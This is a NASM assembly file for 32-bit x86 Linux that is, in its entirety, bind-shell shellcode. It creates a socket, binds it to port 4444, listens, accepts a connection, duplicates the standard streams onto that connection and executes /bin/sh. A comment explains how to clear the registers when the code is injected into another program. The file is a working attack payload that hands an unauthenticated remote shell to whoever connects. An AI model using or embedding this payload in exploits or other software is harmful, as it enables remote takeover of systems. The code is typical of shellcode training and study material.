section .text
global _start
 
_start:
	;if executing from another program use below to clear registers
	;xor eax, eax
	;xor ebx, ebx
	;xor ecx, ecx
	;xor edx, edx
	;xor esi, esi
	;xor edi, edi
	
	;socket(AF_INET, SOCK_STREAM, 0)
	;0x66(0x1) *(0x2,0x1,0x0)
	;eax(ebx)(ecx)
	mov al,0x66   
	mov bl,0x1    
	push edx 
	push dword 0x1 
	push dword 0x2 
	mov ecx,esp    
	int 0x80       
 
    	xchg esi,eax   
 

	;bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;0x66(0x2)(0x66, *(0x2, 0x115c, 0x0, 0x10))
	;eax(ebx) (ecx)
    	push edx   
    	push word 0x5c11  ;port
   	push word 0x2    
    	mov ecx,esp      
     
    	mov al,0x66
    	inc bl
    	push dword 0x10 
    	push ecx        
    	push esi
    	mov ecx,esp     
    	int 0x80        

    	;int listen(int sockfd, int backlog)
	;0x66(0x4) *(0x66, 0x1)
	;eax(ebx) (ecx)
	mov al,0x66    
    	mov bl,0x4     
    	push dword 0x1  
    	push esi        
    	mov ecx,esp     
    	int 0x80
 
	;accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;0x66(0x5) *(0x66, 0x00, 0x00)
	;eax(ebx) (ecx)
    	mov al,0x66
    	inc bl
	xor edx, edx     
    	push edx
	xor edi, edi
    	push edi  
    	push esi       
    	mov ecx,esp
    	int 0x80
    
    	xchg edi,eax
    	xor ecx, ecx
    
	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x2)
	;eax(ebx, ecx)    	
	mov al,0x3f
    	mov ebx, edi
    	mov cl,0x2
    	int 0x80
 
    	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x1)
	;eax(ebx, ecx)   
   	mov al, 0x3f
    	mov ebx, edi
    	mov cl, 0x1
    	int 0x80
     
    	;dup2(int oldfd, int newfd)
	;0x3f(0x66, 0x0)
	;eax(ebx, ecx)   
    	mov al,0x3f
    	mov ebx, edi
    	dec cl
    	int 0x80
 
	;push /bin/sh
    	xor ecx, edx
	push ecx
    	push 0x68732f2f 
    	push 0x6e69622f 

	;execve(const char *filename, char *const argv[], char *const envp[]);
	;0xb(*/bin/sh, 0x0, 0x0)
	;eax(ebx,ecx,edx)
    	mov al,0xb
    	mov ebx,esp
    	xor ecx,ecx
    	xor edx,edx 
    	int 0x80

